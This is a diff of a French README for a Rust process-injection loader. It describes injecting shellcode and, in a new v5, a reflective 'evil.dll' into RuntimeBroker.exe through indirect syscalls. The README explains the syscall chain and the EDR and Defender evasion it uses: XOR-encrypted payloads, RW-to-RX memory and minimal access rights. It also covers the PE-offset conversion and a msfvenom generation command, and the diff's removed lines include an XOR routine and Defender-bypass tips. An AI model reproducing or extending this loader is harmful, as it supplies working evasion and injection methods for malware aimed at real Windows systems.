@@ -1,6 +1,6 @@
 # 🦀 Rust Syscall Loader
 
-Un loader shellcode éducatif utilisant les **indirect syscalls** en Rust pour exécuter calc.exe sur Windows.
+Un loader éducatif utilisant les **indirect syscalls** en Rust pour l'injection de code sur Windows.
 
 > ⚠️ **AVERTISSEMENT**: Ce projet est uniquement à des fins éducatives et de recherche en sécurité. N'utilisez jamais ces techniques à des fins malveillantes.
 
@@ -17,11 +17,12 @@ Un loader shellcode éducatif utilisant les **indirect syscalls** en Rust pour e
 4. [Choix du Process Cible](#-choix-du-process-cible)
 5. [Architecture du Loader](#-architecture-du-loader)
 6. [Flow d'Exécution Détaillé](#-flow-dexécution-détaillé)
-7. [Installation & Compilation](#-installation--compilation)
-8. [Génération du Shellcode](#-génération-du-shellcode)
-9. [Techniques Avancées](#-techniques-avancées)
-10. [Troubleshooting](#-troubleshooting)
-11. [Ressources](#-ressources)
+7. [Reflective DLL Injection (v5)](#-reflective-dll-injection-v5)
+8. [Installation & Compilation](#-installation--compilation)
+9. [Génération du Shellcode](#-génération-du-shellcode)
+10. [Techniques Avancées](#-techniques-avancées)
+11. [Troubleshooting](#-troubleshooting)
+12. [Ressources](#-ressources)
 
 ---
 
@@ -85,7 +86,7 @@ Un **thread** est une unité d'exécution :
 │   ┌──────────┴───┐  ┌──────┴──────┐  ┌───┴────────┐    │
 │   │  Thread 1    │  │  Thread 2   │  │  Thread 3  │    │
 │   │  (UWP perms) │  │  (autre)    │  │  (TON      │    │
-│   │              │  │             │  │  SHELLCODE)│    │
+│   │              │  │             │  │  CODE)     │    │
 │   │  Stack 1     │  │  Stack 2    │  │  Stack 3   │    │
 │   └──────────────┘  └─────────────┘  └────────────┘    │
 │                                                          │
@@ -93,9 +94,9 @@ Un **thread** est une unité d'exécution :
 ```
 
 Quand tu fais `NtCreateThreadEx` dans RuntimeBroker, tu crées un **nouveau thread** qui :
-- Partage toute la mémoire du process (donc peut lire/écrire ton shellcode)
+- Partage toute la mémoire du process (donc peut lire/écrire ton code)
 - A son propre stack et registres
-- Démarre à l'adresse que tu lui donnes (ton shellcode)
+- Démarre à l'adresse que tu lui donnes
 
 #### Le Scheduler Windows
 
@@ -117,7 +118,7 @@ CPU Core 0          CPU Core 1          CPU Core 2
 └────────┘
 ```
 
-Chaque thread a un **quantum** (temps d'exécution). Quand il expire, le scheduler passe au suivant. C'est pour ça que ton shellcode peut s'exécuter "en parallèle" du code légitime de RuntimeBroker.
+Chaque thread a un **quantum** (temps d'exécution). Quand il expire, le scheduler passe au suivant. C'est pour ça que ton code peut s'exécuter "en parallèle" du code légitime de RuntimeBroker.
 
 ---
 
@@ -142,13 +143,13 @@ Un **handle** est une "télécommande" vers un objet kernel, pas l'objet lui-mê
 │                                                             │
 │   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    │
 │   │  Thread 1   │    │  Thread 2   │    │  Thread 3   │    │
-│   │  (UWP)      │    │  (autre)    │    │ (SHELLCODE) │    │
+│   │  (UWP)      │    │  (autre)    │    │ (TON CODE)  │    │
 │   │             │    │             │    │             │    │
 │   │  Running    │    │  Waiting    │    │  Running ✓  │    │
 │   └─────────────┘    └─────────────┘    └─────────────┘    │
 │                                              │              │
 │                                              ▼              │
-│                                      Exécute calc.exe      │
+│                                      Exécute payload       │
 │                                      puis se termine       │
 └─────────────────────────────────────────────────────────────┘
 ```
@@ -169,7 +170,7 @@ NtClose(thread_handle):
   RefCount = 1 (reste le thread lui-même)
   Thread continue de tourner!
 
-Quand shellcode termine:
+Quand le code termine:
   RefCount = 0
   Kernel détruit le Thread object
 ```
@@ -219,7 +220,7 @@ Les EDR injectent du code (hooks) dans `ntdll.dll` pour **intercepter** tous les
               Mais call stack suspecte (pas de ntdll)
 ```
 
-#### Flux avec Indirect Syscalls (v4)
+#### Flux avec Indirect Syscalls (v4+)
 
 ```
 [Programme] → [Setup registres] → [JMP ntdll+X] → [SYSCALL] → [Kernel]
@@ -234,11 +235,11 @@ L'**indirect syscall** saute directement à l'instruction `syscall` dans ntdll, 
 
 | Syscall | Description |
 |---------|-------------|
-| `NtOpenProcess` | Ouvre le processus cible (RuntimeBroker.exe) avec droits minimum |
+| `NtOpenProcess` | Ouvre le processus cible avec droits minimum |
 | `NtAllocateVirtualMemory` | Alloue de la mémoire RW dans le processus cible |
-| `NtWriteVirtualMemory` | Écrit le shellcode dans la mémoire distante |
+| `NtWriteVirtualMemory` | Écrit le code dans la mémoire distante |
 | `NtProtectVirtualMemory` | Change la protection mémoire RW → RX |
-| `NtCreateThreadEx` | Crée un thread distant pour exécuter le shellcode |
+| `NtCreateThreadEx` | Crée un thread distant pour exécuter le code |
 | `NtClose` | Ferme les handles (process et thread) |
 
 ---
@@ -251,7 +252,7 @@ L'**indirect syscall** saute directement à l'instruction `syscall` dans ntdll, 
 1. SIGNATURE STATIQUE
    └── Scan du fichier sur disque
    └── Pattern matching (shellcode connu, strings suspectes)
-   └── ❌ Bypassé par XOR encryption
+   └── ❌ Bypassé par XOR encryption / DLL custom
 
 2. HOOKS NTDLL (comportemental)
    └── Intercepte NtAllocateVirtualMemory, NtWriteVirtualMemory...
@@ -296,6 +297,7 @@ Actions SUSPECTES (comportement de malware) :
 |-----------|------------------|
 | Indirect syscalls | Hooks ntdll.dll + call stack analysis |
 | XOR encryption | Signature statique |
+| Reflective DLL | Pas de LoadLibrary, DLL en mémoire pure |
 | Process injection | Heuristique "shellcode dans le loader" |
 | RW→RX au lieu de RWX | Heuristique mémoire suspecte |
 | Droits minimum (0x002A) | Heuristique "PROCESS_ALL_ACCESS suspect" |
@@ -336,10 +338,6 @@ Actions SUSPECTES (comportement de malware) :
 └─────────────────────────────────────────────────────────────┘
 ```
 
-### Pourquoi pas dllhost.exe ?
-
-`dllhost.exe` peut tourner sous **SYSTEM** (pour certains handlers COM), ce qui cause `STATUS_ACCESS_DENIED` (0xC0000022) même en admin. RuntimeBroker tourne toujours sous ton user.
-
 ---
 
 ## 🏗️ Architecture du Loader
@@ -352,107 +350,130 @@ loader_rust/
 ├── .cargo/
 │   └── config.toml     # Configuration cross-compilation
 ├── src/
-│   └── main.rs         # Code principal avec syscalls
+│   └── main.rs         # Code principal avec syscalls + PE parsing
 └── README.md           # Ce fichier
-```
-
-### Vue d'Ensemble du Code
-
-```rust
-fn main() {
-    // 1. Trouver RuntimeBroker.exe existant
-    let pid = find_process_pid("RuntimeBroker.exe");
-
-    // 2. Inject shellcode
-    inject_shellcode(pid, &ENCRYPTED_SHELLCODE);
-}
-
-fn find_process_pid(name: &str) -> Option<u32> {
-    // CreateToolhelp32Snapshot + Process32First/Next
-    // Énumère tous les processes, retourne le PID du match
-}
-
-fn inject_shellcode(pid: u32, shellcode: &[u8]) {
-    // XOR decrypt
-    let decrypted = xor_decrypt(shellcode, &XOR_KEY);
-
-    // Open target process (minimum rights!)
-    syscall!("NtOpenProcess", pid, 0x002A)  // Not PROCESS_ALL_ACCESS!
-
-    // Allocate RW memory in target
-    syscall!("NtAllocateVirtualMemory", PAGE_READWRITE)
-
-    // Write shellcode (indirect syscall!)
-    syscall!("NtWriteVirtualMemory", shellcode)
-
-    // Change to RX
-    syscall!("NtProtectVirtualMemory", PAGE_EXECUTE_READ)
-
-    // Create remote thread
-    syscall!("NtCreateThreadEx", ...)
-
-    // Cleanup with syscalls
-    syscall!("NtClose", thread_handle)
-    syscall!("NtClose", process_handle)
-}
 ```
 
 ---
 
 ## 🔄 Flow d'Exécution Détaillé
 
-### Timeline Complète
+### v4 : Shellcode Injection
 
 ```
-Timeline:
-─────────────────────────────────────────────────────────────►
-
 LOADER:
-  │
-  ├── CreateToolhelp32Snapshot → Liste processes
-  ├── Process32First/Next → Trouve RuntimeBroker.exe → PID
-  ├── NtOpenProcess(RuntimeBroker) → process_handle
-  ├── NtAllocateVirtualMemory → alloue dans RuntimeBroker
-  ├── NtWriteVirtualMemory → copie shellcode
-  ├── NtProtectVirtualMemory → RW → RX
-  ├── NtCreateThreadEx → thread_handle (thread DEMARRE ici!)
-  │         │
-  │         │ Le thread est lancé, il tourne indépendamment
-  │         ▼
-  ├── NtClose(thread_handle)   ← Juste "je m'en fiche maintenant"
-  ├── NtClose(process_handle)  ← Pareil
-  └── exit(0)  ← Loader se termine
-
-                    PENDANT CE TEMPS dans RuntimeBroker...
-
-THREAD SHELLCODE:
-  │
-  ├── Démarre à l'adresse du shellcode
-  ├── Exécute les opcodes
-  ├── Lance calc.exe
-  └── Thread se termine (ExitThread)
-                            │
-                            ▼
-                    calc.exe est ouvert!
+  ├── FindProcess("RuntimeBroker.exe") → PID
+  ├── NtOpenProcess → process_handle
+  ├── NtAllocateVirtualMemory (RW)
+  ├── XOR decrypt shellcode
+  ├── NtWriteVirtualMemory (copie shellcode)
+  ├── NtProtectVirtualMemory (RW → RX)
+  ├── NtCreateThreadEx → thread démarre au début du buffer
+  ├── NtClose (cleanup)
+  └── exit
 ```
 
-### État Final
+### v5 : Reflective DLL Injection
 
 ```
-┌──────────────────┐
-│ LOADER.EXE       │ ← Terminé, n'existe plus
-└──────────────────┘
+LOADER:
+  ├── Parse PE de evil.dll embarquée
+  │   ├── DOS Header → NT Headers
+  │   ├── Export Directory → trouve "ReflectiveLoader"
+  │   └── Convertit RVA → File Offset
+  ├── FindProcess("RuntimeBroker.exe") → PID
+  ├── NtOpenProcess → process_handle
+  ├── NtAllocateVirtualMemory (RW, taille = DLL entière)
+  ├── NtWriteVirtualMemory (copie DLL brute)
+  ├── NtProtectVirtualMemory (RW → RX)
+  ├── NtCreateThreadEx → thread démarre à (base + ReflectiveLoader_offset)
+  │                       avec base_address en lpParameter
+  ├── NtClose (cleanup)
+  └── exit
 
-┌──────────────────┐
-│ RUNTIMEBROKER.EXE│ ← Toujours là, thread shellcode terminé
-│                  │   (RuntimeBroker fonctionne normalement)
-└──────────────────┘
-
-┌──────────────────┐
-│ CALC.EXE         │ ← Nouveau process, indépendant
-│                  │   (la calculatrice est ouverte!)
-└──────────────────┘
+        DANS RUNTIMEBROKER (ReflectiveLoader):
+          ├── Reçoit base_address via lpParameter
+          ├── Ldr() : trouve kernel32/ntdll via PEB
+          ├── MapImageAndExecute():
+          │   ├── Alloue mémoire propre
+          │   ├── Copie sections (.text, .data, etc.)
+          │   ├── Résout imports
+          │   ├── Applique relocations
+          │   └── Appelle DllMain(DLL_PROCESS_ATTACH)
+          └── Ta payload s'exécute !
 ```
+
+---
+
+## 🪞 Reflective DLL Injection (v5)
+
+### Concept
+
+Au lieu d'injecter du shellcode brut, on injecte une **DLL entière** qui contient son propre loader. La DLL sait comment se charger en mémoire sans l'aide de `LoadLibrary`.
+
+### Avantages vs Shellcode
+
+| Aspect | Shellcode | Reflective DLL |
+|--------|-----------|----------------|
+| Taille payload | Limité | Illimité |
+| Langage | ASM | C/C++ |
+| Debugging | Difficile | Facile |
+| Fonctionnalités | Basique | Complètes (imports, etc.) |
+| Extensibilité | Faible | Haute |
+
+### PE Parsing dans le Loader Rust
+
+Le loader doit trouver l'offset de `ReflectiveLoader` dans la DLL :
+
+```
+evil.dll (fichier brut):
+┌─────────────────────────────────────────────────────────┐
+│ DOS Header                                              │
+│   └── e_lfanew → offset vers NT Headers                │
+├─────────────────────────────────────────────────────────┤
+│ NT Headers                                              │
+│   └── OptionalHeader.DataDirectories[0] → Export Dir   │
+├─────────────────────────────────────────────────────────┤
+│ Section Headers                                         │
+│   └── .text: VirtualAddress=0x1000, PointerToRawData=0x600 │
+├─────────────────────────────────────────────────────────┤
+│ .text section (code)                                    │
+│   └── ReflectiveLoader() quelque part ici              │
+├─────────────────────────────────────────────────────────┤
+│ Export Directory                                        │
+│   └── "ReflectiveLoader" → RVA 0x3075                  │
+└─────────────────────────────────────────────────────────┘
+```
+
+### RVA vs File Offset
+
+**Problème critique** : On injecte la DLL **brute** (fichier), pas mappée en mémoire.
+
+```
+RVA (Relative Virtual Address) = adresse quand la DLL est mappée
+File Offset = position dans le fichier sur disque
+
+Ce sont deux choses DIFFÉRENTES !
+```
+
+**Conversion** :
+```
+ReflectiveLoader RVA: 0x3075
+Section .text: RVA=0x1000, FileOffset=0x600
+
+Offset dans section = 0x3075 - 0x1000 = 0x2075
+File offset = 0x600 + 0x2075 = 0x2675
+```
+
+Le loader Rust fait cette conversion automatiquement via `rva_to_offset()`.
+
+### Documentation Complète
+
+Voir **[../reflective_dll/README.md](../reflective_dll/README.md)** pour :
+- Explication détaillée du code C++ (ReflectiveLdr)
+- Modifications apportées pour compatibilité MinGW
+- Problèmes de compilation et solutions
+- Guide de debugging
 
 ---
 
@@ -483,9 +504,6 @@ sudo apt install mingw-w64
 ### Build pour Windows (depuis macOS)
 
 ```bash
-# Debug build
-cargo build --target x86_64-pc-windows-gnu
-
 # Release build (recommandé)
 cargo build --release --target x86_64-pc-windows-gnu
 ```
@@ -497,7 +515,7 @@ target/x86_64-pc-windows-gnu/release/calc_loader.exe
 
 ### Configuration Cross-Compilation
 
-Créez `.cargo/config.toml` :
+`.cargo/config.toml` :
 
 ```toml
 [target.x86_64-pc-windows-gnu]
@@ -519,17 +537,9 @@ codegen-units = 1    # Meilleures optimisations globales
 
 ---
 
-## 🔧 Génération du Shellcode
+## 🔧 Génération du Shellcode (v4)
 
-### Installation de Metasploit (macOS)
-
-```bash
-# Option 1: Homebrew (recommandé)
-brew install metasploit
-
-# Option 2: Docker
-docker run -it --rm metasploitframework/metasploit-framework msfvenom [options]
-```
+> **Note** : Pour v5 (Reflective DLL), voir [../reflective_dll/README.md](../reflective_dll/README.md)
 
 ### Commande de Génération
 
@@ -542,40 +552,10 @@ msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f rust
 
 | Option | Fonction appelée | Effet |
 |--------|------------------|-------|
-| `process` | `ExitProcess()` | ❌ Tue tout le process hôte (RuntimeBroker meurt) |
-| `thread` | `ExitThread()` | ✅ Tue juste le thread injecté (RuntimeBroker survit) |
+| `process` | `ExitProcess()` | ❌ Tue tout le process hôte |
+| `thread` | `ExitThread()` | ✅ Tue juste le thread injecté |
 | `seh` | Exception SEH | Exit via exception handler |
 | `none` | Rien | Le shellcode continue/crash |
-
-#### Ce qui se passe avec EXITFUNC=thread (correct)
-
-```
-┌─────────────────────────────────────┐
-│        RUNTIMEBROKER.EXE            │
-│                                     │
-│  Thread Main ──► Continue normal ✓  │
-│                                     │
-│  Thread Shell ─► WinExec(calc)      │
-│                  ExitThread(0)      │
-│                       │             │
-│                       ▼             │
-│                  Thread MORT        │
-│                  (RuntimeBroker OK) │
-└─────────────────────────────────────┘
-```
-
-### Chiffrement XOR
-
-Après génération, chiffrez le shellcode avec une clé XOR pour éviter la détection statique :
-
-```rust
-fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
-    data.iter()
-        .enumerate()
-        .map(|(i, b)| b ^ key[i % key.len()])
-        .collect()
-}
-```
 
 ---
 
@@ -583,14 +563,14 @@ fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
 
 | Technique | Description | Difficulté |
 |-----------|-------------|------------|
-| Indirect Syscalls | Saute dans ntdll après le hook (call stack légitime) | ⭐⭐ |
-| Hell's Gate | Récupère SSN dynamiquement en parsant ntdll | ⭐⭐⭐ |
-| Halo's Gate | Hell's Gate + gère les fonctions hookées | ⭐⭐⭐⭐ |
-| TartarusGate | Halo's Gate amélioré | ⭐⭐⭐⭐⭐ |
-| Sleep Obfuscation | Chiffre le shellcode pendant les sleep | ⭐⭐⭐ |
-| Module Stomping | Écrase une DLL légitime avec ton code | ⭐⭐⭐⭐ |
+| Indirect Syscalls | Saute dans ntdll après le hook | ⭐⭐ |
+| Reflective DLL | DLL qui se charge elle-même | ⭐⭐⭐ |
+| Hell's Gate | Récupère SSN dynamiquement | ⭐⭐⭐ |
+| Halo's Gate | Hell's Gate + gère les hooks | ⭐⭐⭐⭐ |
+| Sleep Obfuscation | Chiffre pendant les sleep | ⭐⭐⭐ |
+| Module Stomping | Écrase une DLL légitime | ⭐⭐⭐⭐ |
 | Process Hollowing | Remplace le code d'un process suspendu | ⭐⭐⭐ |
-| Thread Hijacking | Détourne un thread existant au lieu d'en créer | ⭐⭐⭐⭐ |
+| Thread Hijacking | Détourne un thread existant | ⭐⭐⭐⭐ |
 
 ---
 
@@ -599,10 +579,8 @@ fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
 ### Erreur de compilation "linker not found"
 
 ```bash
-# Vérifiez que mingw-w64 est installé
 which x86_64-w64-mingw32-gcc
-
-# Si pas trouvé, installez-le
+# Si pas trouvé:
 brew install mingw-w64
 ```
 
@@ -610,65 +588,27 @@ brew install mingw-w64
 
 ```bash
 rustup default nightly
-# ou
-cargo +nightly build --release --target x86_64-pc-windows-gnu
 ```
 
 ### NtOpenProcess failed: 0xC0000022 (STATUS_ACCESS_DENIED)
 
-Le process cible tourne sous SYSTEM ou un autre user. Solutions :
+Le process cible tourne sous SYSTEM. Utilise `RuntimeBroker.exe` (tourne toujours sous ton user).
 
-1. **Utilise RuntimeBroker.exe** (tourne toujours sous ton user)
-2. Ou lance le loader en **admin**
-3. Ou essaie un autre process : `taskhostw.exe`, `sihost.exe`
+### RuntimeBroker.exe not found
 
-```rust
-// Change la cible dans le code
-let pid = match find_process_pid("RuntimeBroker.exe") {
-```
+Ouvre les Settings Windows ou une app UWP pour en spawner un.
 
-### "RuntimeBroker.exe not found"
+### v5: DllMain jamais appelé
 
-Très rare — RuntimeBroker tourne toujours si t'as des apps UWP (Settings, Calculator, etc.). Ouvre juste les Settings Windows pour en spawner un.
+1. Vérifie les imports de la DLL : `objdump -p evil.dll | grep "DLL Name"`
+2. Doit montrer seulement `KERNEL32.dll` (et `api-ms-win-crt-*`)
+3. Si `libgcc` ou `libstdc++` présents → recompile avec `-static`
 
-### RuntimeBroker se ferme avec calc.exe
+### v5: Process crash immédiatement
 
-Tu as oublié `EXITFUNC=thread` ! Régénère le shellcode :
-
-```bash
-msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f rust
-```
-
-### Windows Defender bloque l'exécution
-
-Avec la v4, le loader devrait bypass Defender grâce à :
-- XOR encryption du shellcode (pas de signature statique)
-- Process injection dans un process existant
-- Indirect syscalls (bypass hooks ntdll + call stack légitime)
-- RW→RX (pas de RWX suspect)
-- Droits minimum (0x002A)
-
-Si toujours détecté :
-1. Rebuild sur une machine propre (hash grillé ?)
-2. Changez le shellcode (msfvenom est très connu)
-3. Utilisez une VM isolée pour tester
-4. Considérez sleep obfuscation
-
----
-
-## 🚀 Utilisation
-
-1. Compilez le projet
-2. Transférez le `.exe` sur une VM Windows
-3. Exécutez-le → La calculatrice s'ouvre !
-
-```powershell
-# Sur Windows - Téléchargement depuis un serveur HTTP
-Invoke-WebRequest -Uri "http://192.168.x.x:8080/target/x86_64-pc-windows-gnu/release/calc_loader.exe" -OutFile "loader.exe"
-
-# Exécution
-.\loader.exe
-```
+1. Vérifie que `GetPEB()` utilise l'inline ASM MinGW (pas `__readgsqword`)
+2. Vérifie que `ReflectiveLoader` utilise `lpParameter` comme base address
+3. Voir [../reflective_dll/README.md](../reflective_dll/README.md) pour les modifications requises
 
 ---
 
@@ -679,16 +619,17 @@ Invoke-WebRequest -Uri "http://192.168.x.x:8080/target/x86_64-pc-windows-gnu/rel
 | v1 | Direct syscalls | Shellcode dans le loader |
 | v2 | + XOR + RW→RX | Encryption + meilleure protection mémoire |
 | v3 | + Process injection (notepad) | Spawn notepad + injection |
-| v4 | + Indirect syscalls + RuntimeBroker | Injection dans process existant (user context) |
+| v4 | + Indirect syscalls + RuntimeBroker | Injection dans process existant |
+| **v5** | **+ Reflective DLL Injection** | **DLL complète avec PE parsing** |
 
 ---
 
 ## 📖 Ressources
 
-- [rust_syscalls](https://github.com/janoglezcampos/rust_syscalls) - Bibliothèque syscalls Rust (direct + indirect)
-- [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development) - Exemples et techniques
-- [SysWhispers3](https://github.com/klezVirus/SysWhispers3) - Génération de syscalls
-- [Red Team Notes - Syscalls](https://www.ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs) - Tutoriels syscalls
+- [rust_syscalls](https://github.com/janoglezcampos/rust_syscalls) - Bibliothèque syscalls Rust
+- [ReflectiveLdr](https://github.com/rokups/ReflectiveLdr) - Base du reflective loader
+- [Stephen Fewer - ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection) - Original
+- [Red Team Notes](https://www.ired.team/) - Tutoriels techniques offensives
 
 ---
 
